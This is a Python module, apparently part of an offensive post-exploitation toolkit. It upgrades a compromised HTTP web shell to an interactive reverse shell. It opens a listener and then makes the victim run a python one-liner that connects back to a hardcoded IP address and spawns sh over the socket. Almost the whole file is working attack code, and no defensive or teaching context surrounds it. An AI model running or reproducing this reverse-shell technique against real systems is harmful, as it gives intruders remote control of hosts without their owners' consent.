#!/usr/bin/env python3

import sys
sys.path.append('..')

from transformators.transformator import Transformator
from nodes.reverse_shell import ReverseShell

import threading
import socket
import time


def run_reverse_shell_connector(httpshell, ip, port):
    httpshell.execute(f"""python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'""")



class HTTPShellToReverseShell(Transformator):
    name = 'http shell to reverse shell'
    input_node = 'SimpleHTTPShell'
    last_open_port = 8000

    @staticmethod
    def transform(node):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        port = HTTPShellToReverseShell.last_open_port + 1
        HTTPShellToReverseShell.last_open_port += 1
        sock.bind(('0.0.0.0', port))
        sock.listen(1)
        thread = threading.Thread(target=run_reverse_shell_connector, args=(node, '10.9.27.191', port))
        thread.start()
        conn, addr = sock.accept()
        print('[+]', 'Got a reverse shell from', addr)
        return [ReverseShell(conn)]
